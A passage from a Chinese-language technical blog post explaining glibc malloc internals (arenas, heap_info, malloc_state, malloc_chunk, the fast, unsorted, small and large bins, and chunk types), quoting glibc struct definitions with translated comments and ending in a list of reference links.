<strong>arena1</strong> 或者 <strong>arena2</strong>）。那么该选择哪个 <strong>arena</strong> 进行重复利用呢？<code>glibc</code> 的 <code>malloc</code> 遵循以下规则：</p><ol><li>首先循环遍历所有可用的 <strong>arena</strong>，在遍历的过程中，它会尝试加锁该 <strong>arena</strong>。如果成功加锁（该 <strong>arena</strong> 当前对应的线程并未使用堆内存则表示可加锁），比如将 <strong>main arena</strong> 成功锁住，那么就将 <strong>main arena</strong> 返回给用户，即表示该 <strong>arena</strong> 被子线程 3 共享使用。</li><li>如果没能找到可用的 <strong>arena</strong>，那么就将子线程 3 的 <code>malloc</code> 操作阻塞，直到有可用的 <strong>arena</strong> 为止。</li><li>如果子线程 3 再次调用 <code>malloc</code> 的话（第二次使用arena），<code>glibc</code> 的 <code>malloc</code> 就会先尝试使用最近访问的 <strong>arena</strong>（此时为 <strong>main arena</strong>）。如果此时 <strong>main arena</strong> 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 <strong>main arena</strong> 再次可用为止（为了防止开销过大问题）。</li></ol><h2 id="堆的数据结构"><a href="#堆的数据结构" class="headerlink" title="堆的数据结构"></a>堆的数据结构</h2><p>在 <code>glibc</code> 的 <code>malloc</code> 中针对堆管理，主要涉及到以下 3 种数据结构</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>我们把从操作系统申请的一块内存称为一个 <strong>heap</strong>，这个 <strong>heap</strong> 的信息就是用 <code>heap_info</code> 表示，也称为 <strong>heap header</strong>，因为一个 <strong>thread arena</strong>（注意：不包含主线程）可以包含多个 <strong>heap</strong>，所以为了便于管理，就给每个 <strong>heap</strong> 用一个 <code>heap_info</code> 表示。</p><blockquote><p>此处的 <strong>heap</strong> 并非广义上的进程的虚拟内存空间中的堆，而是子线程通过系统调用 <code>mmap</code> 从操作系统申请的一块内存空间，后面 <strong>heap</strong> 不做声明，均是这个意思。同时我们把主线程的 <strong>main arena</strong> 的那个区域也成为 <strong>heap</strong>，这种称呼也是对的，二者功能相同，只不过位置不同，但是 <strong>main arena</strong> 中只包含一个可以自增长的 <strong>heap</strong>。</p></blockquote><p>那么在什么情况下一个 <strong>thread arena</strong> 会包含多个 <strong>heap</strong> 呢？在当前 <strong>heap</strong> 不够用的时候，<code>malloc</code> 会通过系统调用 <code>mmap</code> 申请新的 <strong>heap</strong>（这部分空间本来是位于内存映射区区域），新的 <strong>heap</strong> 会被添加到当前 <strong>thread arena</strong> 中，便于管理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;                <span class="comment">/* arena for this heap. */</span> <span class="comment">/*这堆的竞技场。*/</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev;      <span class="comment">/* Previous heap. */</span> <span class="comment">/*以前的堆。*/</span></span><br><span class="line">  <span class="type">size_t</span> size;                  <span class="comment">/* Current size in bytes. */</span> <span class="comment">/*当前大小以字节为单位。*/</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size;         <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                                   PROT_READ|PROT_WRITE.  */</span> <span class="comment">/*以mprotectated的字节的大小*/</span></span><br><span class="line">   <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">      that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">      MALLOC_ALIGNMENT. */</span> <span class="comment">/*确保以下数据正确对齐*/</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code> 用于表示 <strong>arena</strong> 的信息，因此也被称为 <strong>arena header</strong>，每个线程只含有一个 <strong>arena header</strong>。<strong>arena header</strong> 包含 <strong>bin</strong>、<strong>top chunk</strong> 以及 <strong>last remainder chunk</strong> 等信息，这些概念会在后文详细介绍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Serialize access.  */</span> <span class="comment">/*序列化访问。*/</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span> <span class="comment">/*标志（以前在max_fast）。*/</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span> <span class="comment">/*快速的bins*/</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>  <span class="comment">/*最顶层块的基础 - 没有以其他方式保存在垃圾箱里*/</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span> <span class="comment">/*剩余的来自小型请求的最新分裂*/</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span> <span class="comment">/*如上所述包装正常箱*/</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span> <span class="comment">/*bins的位图*/</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span> <span class="comment">/*链接名单*/</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span> <span class="comment">/*免费竞技场的链表。*/</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span> <span class="comment">/*在此竞技场中分配的内存。*/</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>为了便于管理和更加高效的利用内存，一个 <strong>heap</strong> 被分为多个 <strong>chunk</strong>，每个 <strong>chunk</strong> 的大小不是固定，是根据用户的请求决定的，也就是说用户调用 <code>malloc(size_t size)</code> 传递的 <code>size</code> 参数就是 <strong>chunk</strong> 的大小（这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文）。每个 <strong>chunk</strong> 都由一个结构体 <code>malloc_chunk</code> 表示，也成为 <strong>chunk header</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span> <span class="comment">/*之前块的大小*/</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span> <span class="comment">/*大小以字节为单位，包括开销*/</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="comment">/*仅用于大块：指向下一个更大的尺寸*/</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于上述的三种结构，基本都是针对子线程的，主线程和子线程有一些不同：</p><ol><li>主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 <strong>heap</strong> 所以也就不含有 <code>heap_info</code> 结构体。当需要更多堆空间的时候，直接通过增长 <code>brk</code> 指针来获取更多的空间，直到它碰到内存映射区域为止。</li><li>不同于 <strong>thread arena</strong>，主线程的 <strong>main arena</strong> 的 <strong>arena header</strong> 并不在堆区中，而是一个全局变量，因此它属于 <code>libc.so</code> 的 data segment 区域。</li><li><strong>heap</strong>的结构体<code>heap_info</code>，<strong>arena</strong>的结构体<code>malloc_state</code>，<strong>chunk</strong>的结构体<code>malloc_chunk</code></li></ol><h2 id="heap-与-arena-的关系"><a href="#heap-与-arena-的关系" class="headerlink" title="heap 与 arena 的关系"></a>heap 与 arena 的关系</h2><p>首先，通过内存分布图理清 <code>malloc_state</code> 与 <code>heap_info</code> 之间的组织关系。</p><blockquote><p>下图是<strong>main arena</strong> 和 <strong>thread arena</strong>（只有一个heap的时候） 的内存分布图：</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/8.png" alt="single heap"></p><p>关于Main Arena的几个点：</p><ul><li>Main Arena中的malloc_state结构是不在Heap中的，并且是存在于libc.so的data段的</li><li>Main Arena是没有heap_info结构的（因为只有一个Heap）</li><li>malloc_state结构中的top成员是指向malloc_chunk结构和Allocated Chunk中间的</li><li>Top Chunk、Allocated Chunk、Free Chunk其中的任何一个和malloc_chunk结构进行组合才是一个完整的chunk块</li></ul><p>关于Thread Arena（单Heap）的几个点：</p><ul><li>Thread Arena中的malloc_state是分配在Heap中的</li><li>heap_info结构中的ar_ptr成员是指向malloc_state结构中的开头，而malloc_state结构中的top成员是指向malloc_chunk和Allocated Chunk中间的（这个是和Main Arena一样的）</li></ul><blockquote><p>下图是一个 <strong>thread arena</strong> 中含有多个 <strong>heap</strong> 的情况：</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/9.png" alt="multi-heap"></p><p>由于两个 <strong>heap</strong> 是通过 <code>mmap</code> 从操作系统申请的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，<code>glibc</code> 的 <code>malloc</code> 将第二个 <code>heap_info</code> 结构体的 <code>prev</code> 成员指向了第一个 <code>heap_info</code> 结构体的起始位置（即 <code>ar_ptr</code> 成员），而第一个 <code>heap_info</code> 结构体的 <code>ar_ptr</code> 成员指向了 <code>malloc_state</code>，这样就构成了一个单链表，方便后续管理。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>用户释放掉的 <strong>chunk</strong> 不会马上归还给系统，<strong>ptmalloc</strong> 会统一管理 <strong>heap</strong> 和 <strong>mmap</strong> 映射区域中的空闲的 <strong>chunk</strong>。当用户再一次请求分配内存时，<strong>ptmalloc</strong> 分配器会试图在空闲的 <strong>chunk</strong> 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>在具体的实现中，<strong>ptmalloc</strong> 采用分箱式方法对空闲的 <strong>chunk</strong> 进行管理。首先，它会根据空闲的 <strong>chunk</strong> 的大小以及使用状态将 <strong>chunk</strong> 初步分为 4 类：<strong>fast bins</strong>，<strong>small bins</strong>，<strong>large bins</strong>，<strong>unsorted bin</strong>。每类中仍然有更细的划分，相似大小的<strong>chunk</strong> 会用双向链表链接起来。也就是说，在每类<strong>bin</strong> 的内部仍然会有多个互不相关的链表来保存不同大小的 <strong>chunk</strong>。</p><p>对于 <strong>small bins</strong>，<strong>large bins</strong>，<strong>unsorted bin</strong> 来说，<code>ptmalloc</code> 将它们维护在同一个数组中。这些 <strong>bin</strong> 对应的数据结构在<code>malloc_state</code> 中，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p><strong>bin</strong> 作为一种记录 <strong>free chunk</strong> 的链表数据结构。系统针对不同大小的 <strong>free chunk</strong> ，将 <strong>bin</strong> 分为了 4 类：</p><ul><li>fast bin（总共有10个）</li><li>unsorted bin（只有一个）</li><li>small bin（总共有 62 个）</li><li>large bin（总共有63个）</li></ul><p>同时，在 <code>glibc</code> 中用于记录 <strong>bin</strong> 的数据结构有两种，分别为：</p><ul><li><code>fastbinsY</code>: 这是一个数组，用于记录所有的 <strong>fast bin</strong></li><li><code>bins</code> 数组: 这也是一个数组，用于记录除 <strong>fast bin</strong> 之外的所有 <strong>bin</strong> 。事实上这个数组共有 126 个<strong>bin</strong>，分别是：<ul><li>bin [1] : <strong>unsorted bin</strong></li><li>bin [2~63] : <strong>small bin</strong></li><li>bin [64~126] : <strong>large bin</strong></li></ul></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>对于size较小的<strong>chunk</strong>，释放之后单独处理，被放入<strong>fast bin</strong>中。</p><ul><li>32位系统，<strong>fast bin</strong>中的<strong>chunk</strong>大小范围在16字节到64字节；</li><li>64位系统，<strong>fast bin</strong>中的<strong>chunk</strong>大小范围在32字节到128字节。</li></ul><p>下图是32位系统分布图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/12.png" alt="fast bin"></p><p>下图为64位系统的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/14.png" alt="img"></p><p>在内存分配和释放过程中，<strong>fast bin</strong> 是所有 <strong>bin</strong> 中操作速度最快的。下面详细介绍 <strong>fast bin</strong> 的一些特性：</p><ol><li><strong>fast bin</strong> 的个数为10个，并且为了速度，<strong>fast bin</strong>永远不会进行合并，里面<strong>chunk</strong>中的P标志位永远为1</li><li>这类<strong>bin</strong>通常申请和释放的堆块都比较小，所以使用单链表结构，LIFO（后进先出）分配策略。</li><li>在<strong>fastbinsY</strong>数组里按照从小到大的顺序排列。</li></ol><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p><strong>unsorted bin</strong> 可以视为空闲 <strong>chunk</strong> 回归其所属 <strong>bin</strong> 之前的缓冲区。</p><p>其在 <code>glibc</code> 中具体的说明如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>从下面的宏我们可以看出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><p><strong>unsorted bin</strong> 处于我们之前所说的 <strong>bin</strong> 数组下标 1 处。故而 <strong>unsorted bin</strong> 只有一个链表。unsorted bin 中的空闲 <strong>chunk</strong> 处于乱序状态，主要有两个来源</p><ul><li>当一个较大的 <strong>chunk</strong> 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 <strong>fast bin</strong> 的 <strong>chunk</strong>，并且该 <strong>chunk</strong> 不和 <strong>top chunk</strong> 紧邻时，该 <strong>chunk</strong> 会被首先放到 <strong>unsorted bin</strong> 中可以加快分配速度。使用双链表结构，FIFO（先进先出）分配策略。</li></ul><p>以64位为例，<strong>unsorted bin</strong>结构如下（非连续内存，大小无限制）：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/15.png" alt="img"></p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>同一个<strong>small bin</strong>里chunk的大小相同，采用双链表结构，使用频率介于<strong>fast bin</strong>和<strong>large bin</strong>之间。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins</strong> 中每个 <strong>bin</strong> 对应的链表采用 FIFO（先进先出） 的规则，所以同一个链表中先被释放的 <strong>chunk</strong> 会先被分配出去。<strong>small bin</strong>在<strong>bins</strong>中居第2到第63位，共62个。<strong>small bins</strong> 中每个 <strong>chunk</strong> 的大小与其所在的 <strong>bin</strong> 的 <strong>index</strong> 的关系为：<code>chunk_size = 2 * SIZE_SZ * index</code>，具体如下</p><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ&#x3D;4（32 位）</th><th align="left">SIZE_SZ&#x3D;8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/16.png" alt="img"></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><strong>large bins</strong> 中一共包括 63 个 <strong>bin</strong>，每个 <strong>bin</strong> 中的 <strong>chunk</strong> 的大小不一致，而是处于一定区间范围内。此外，这 63 个 <strong>bin</strong> 被分成了 6 组，每组 <strong>bin</strong> 中的 <strong>chunk</strong> 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里我们以 32 位平台的 <strong>large bin</strong> 为例，第一个 <strong>large bin</strong> 的起始 <strong>chunk</strong> 大小为 512 字节，第二个<strong>large bin</strong>的<strong>chunk</strong>最小为512+64字节（处于<code>[512,512+64)</code>之间的<strong>chunk</strong>都属于第一个<strong>large bin</strong>），以此类推，直到第一组结束。64位平台也是一样的，第一个<strong>large bin</strong>的<strong>chunk</strong>最小为1024字节，第二个<strong>large bin</strong>的<strong>chunk</strong>最小为1024+64字节（处于<code>[1024,1024+64)</code>之间的<strong>chunk</strong>都属于第一个large bin）</p><p>下面附上各类上述三类 <strong>bin</strong> 的逻辑：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/13.jpg" alt="img"></p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>在 <code>glibc</code> 的 <code>malloc</code> 中将整个堆内存空间分成了连续的、大小不一的 <strong>chunk</strong>，即对于堆内存管理而言 <strong>chunk</strong> 就是最小操作单位。<strong>chunk</strong> 总共分为4类：</p><ul><li>allocated chunk</li><li>free chunk</li><li>top chunk</li><li>last remainder chunk</li></ul><p>所有类型的 <strong>chunk</strong> 都是内存中一块连续的区域，只是通过该区域中特定位置的某些标识符加以区分。</p><h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>顾名思义就是已经被分配使用的 <strong>chunk</strong> ，区域内容表示如下：</p><ul><li><code>prev_size</code>: <ul><li>如果前一个 <strong>chunk</strong> 是 <strong>free chunk</strong>，则这个内容保存的是前一个 <strong>chunk</strong> 的大小。并且这个字段是归属于当前的chunk的</li><li>如果前一个 <strong>chunk</strong> 是 <strong>allocated chunk</strong>，则这个区域保存的是前一个 <strong>chunk</strong> 的用户数据（也有可能为填充值）。并且这个字段就不属于当前的chunk了</li></ul></li><li><code>size</code>: 保存的是当前这个chunk的大小。总共是 32 位，并且最后的 3 位作为标志位：<ul><li><code>PREV_INUSE (P)</code>: 表示前一个 <strong>chunk</strong> 是否为 <strong>allocated chunk</strong>，而当前是不是 <strong>chunk allocated</strong> 可以通过查询下一个 <strong>chunk</strong> 的这个标志位来得知）</li><li><code>IS_MMAPPED (M)</code>: 表示当前 <strong>chunk</strong> 是否是通过 <code>mmap</code> 系统调用产生的，子线程是 <code>mmap</code>，主线程则是通过 <code>brk</code>。</li><li><code>NON_MAIN_arena (N)</code>: 表示当前 <strong>chunk</strong> 是否属于 <strong>main arena</strong>，也就是主线程的 <strong>arena</strong>。（主线程和子线程的堆区不一样，前文已经做了详细说明）。</li></ul></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/10.png" alt="allocated chunk"></p><p>几个注意点：</p><ol><li>每个 <strong>chunk</strong> 的大小怎么确定？<br>用户程序调用 <code>malloc(size_t size)</code> 就会创建一个<strong>chunk</strong>，传入的大小就是当前分配的 <strong>chunk</strong> 大小，这个是非常重要的。</li><li>我们为什么要知道前一个 <strong>chunk</strong> 的信息？<br>为了方便合并不同的 <strong>chunk</strong> ，减少内存的碎片化。如果不这么做， <strong>chunk</strong> 的合并只能向下合并，必须从头遍历整个堆，然后加以合并，这就意味着每次进行 <strong>chunk</strong> 释放操作消耗的时间与堆的大小成线性关系。</li><li><strong>chunk</strong> 的链表是如何构成的？<br><strong>chunk</strong> 在堆内存上是连续的，并不是直接由指针构成的链表，而是通过 <code>prev_size</code> 和 <code>size</code> 块构成了隐式的链表。在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的 <strong>chunk</strong> ，分析每个 <strong>chunk</strong> 的 <code>size</code> 字段，进而找到合适的 <strong>chunk</strong>。</li></ol><h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><ul><li><code>prev_size</code>: 为了防止碎片化，堆中不存在两个相邻的 <strong>free chunk</strong> （如果存在，则被堆管理器合并了）。因此对于一个 <strong>free chunk</strong> ，这个 <code>prev_size</code> 区域中一定包含的上一个 <strong>chunk</strong> 的部分有效数据或者为了地址对齐所做的填充对齐。</li><li><code>size</code>: 同 <strong>allocated chunk</strong> ，表示当前 <strong>chunk</strong> 的大小，其标志位<code>N</code>，<code>M</code>，<code>P</code> 也同 <strong>allocated chunk</strong> 一样。</li><li><code>fd</code>: 前向指针——指向当前 <strong>chunk</strong> 在同一个 <strong>bin</strong>（一种用于加快内存分配和释放效率的显示链表）的下一个（线性中的前一个） <strong>chunk</strong></li><li><code>bk</code>: 后向指针——指向当前 <strong>chunk</strong> 在同一个 <strong>bin</strong> 的上一个（线性中的后一个） <strong>chunk</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/11.png" alt="free chunk"></p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>当一个 <strong>chunk</strong> 处于一个<strong>arena</strong>的最顶部（即最高内存地址处）的时候，就称之为 <strong>top chunk</strong>。该 <strong>chunk</strong> 并不属于任何 <strong>bin</strong> ，而是在当前的 <strong>heap</strong> 所有的 <strong>free chunk</strong> （无论那种 <strong>bin</strong>）都无法满足用户请求的内存大小的时候，将此 <strong>chunk</strong> 当做一个应急消防员，分配给用户使用。如果 <strong>top chunk</strong> 的大小比用户请求的大小要大的话，就将该 <strong>top chunk</strong> 分作两部分：用户请求的 <strong>chunk</strong> 和剩余的部分（成为新的 <strong>top chunk</strong>）。否则，就需要扩展 <strong>heap</strong> 或分配新的 <strong>heap</strong> 了，在 <strong>main arena</strong> 中通过 <code>sbrk</code> 扩展 <strong>heap</strong>，而在<strong>thread arena</strong> 中通过 <code>mmap</code> 分配新的 <strong>heap</strong>。注意，至此我们已经多次强调，主线程和子线程的堆管理方式的差异。</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>它是如何产生的：当用户请求的是一个 <strong>small chunk</strong>，且该请求无法被 <strong>small bin</strong>、<strong>unsorted bin</strong> 满足的时候，就通过 <code>binmaps</code> 遍历 <strong>bin</strong> 查找最合适的 <strong>chunk</strong> ，如果该 <strong>chunk</strong> 有剩余部分的话，就将该剩余部分变成一个新的 <strong>chunk</strong> 加入到 <strong>unsorted bin</strong> 中，另外，再将该新的 <strong>chunk</strong> 变成新的 <strong>last remainder chunk</strong> 。</p><p>它的作用是：此类型的 <strong>chunk</strong> 用于提高连续 <code>malloc</code>（产生大量 <strong>small chunk</strong>）的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个 <strong>small chunk</strong> ，且该请求无法被 <strong>small bin</strong> 满足，那么就转而交由 <strong>unsorted bin</strong> 处理。同时，假设当前 <strong>unsorted bin</strong> 中只有一个 <strong>chunk</strong> 的话，也就是 <strong>last remainder chunk</strong> ，那么就将该 <strong>chunk</strong> 分成两部分：前者分配给用户，剩下的部分放到 <strong>unsorted bin</strong> 中，并成为新的 <strong>last remainder chunk</strong> 。这样就保证了连续 <code>malloc</code> 产生的各个 <strong>small chunk</strong> 在内存分布中是相邻的，即提高了内存分配的局部性。</p><h2 id="Glibc内存管理流程图"><a href="#Glibc内存管理流程图" class="headerlink" title="Glibc内存管理流程图"></a>Glibc内存管理流程图</h2><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/17.png" alt="img"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://introspelliam.github.io/2017/09/10/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/</span><br><span class="line">https://murphypei.github.io/blog/2019/01/linux-heap</span><br><span class="line">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</span><br><span 